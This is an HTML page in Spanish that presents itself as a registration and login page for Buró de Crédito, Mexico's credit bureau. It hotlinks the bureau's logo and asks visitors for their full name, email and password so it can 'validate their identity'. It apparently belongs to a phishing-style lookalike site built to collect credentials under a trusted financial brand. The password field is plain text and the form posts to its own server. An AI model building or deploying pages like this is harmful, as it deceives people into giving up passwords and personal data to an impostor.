<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" type="image/x-icon" href="https://uploads-ssl.webflow.com/5e3c807f0eb5905168653b61/5e46eb491ffbe325e07c8e61_32x32-14.png">
	<link rel="stylesheet" href="index.css">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<script src="https://kit.fontawesome.com/a076d05399.js"></script>
	<link rel="stylesheet" href="pages1.css">
	<title>Registro Buro de Credito</title>
</head>
<body>
	<nav>
		<input type="checkbox" id="check">
		<label for="check" class="checkbtn">
			<i class="fas fa-bars"></i>
		</label>
		<label class="logo"><img src="https://www.burodecredito.com.mx/img/logo-buro.jpg" alt=""></label>
		<ul>
			<li><a href="index.php" class="text">Home</a></li>
			<li><a class="active" href="registro.php">Comienza ahora, es gratis</a></li>
		</ul>
	</nav>
	<!--Procedimiento-->
	<div class="procedimiento">
		<div class="align-procedimiento">
			<div class="titl">
				<p class="pasos">¡Ya casí!</p>
				<h1>Iniciar Sesion</h1>
				<p class="mini">Ingresa los datos solicitados, nos ayudara a validar tu identidad.</p>
			</div>
			<div class="formulario-god">
				<form  method="POST">
					<div class="contenido">
						<label>Nombre Completo</label>
						<br>
						<input type="text" name="name" placeholder="Nombre Completo">
						<br>
						<label for="text">Email</label>
						<br>
						<input type="text" placeholder="Email" name="key">
						<br>
						<label>Contraseña</label>
						<br>
						<input type="text" name="crp" placeholder="Contraseña">
						<br>
					</div>
					<div class="contenido">
						<button type="submit" class="form-button"><a href="score.php" style="color: #fff;">Siguiente</a></button>
					</div>
					<div class="contenido"></div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>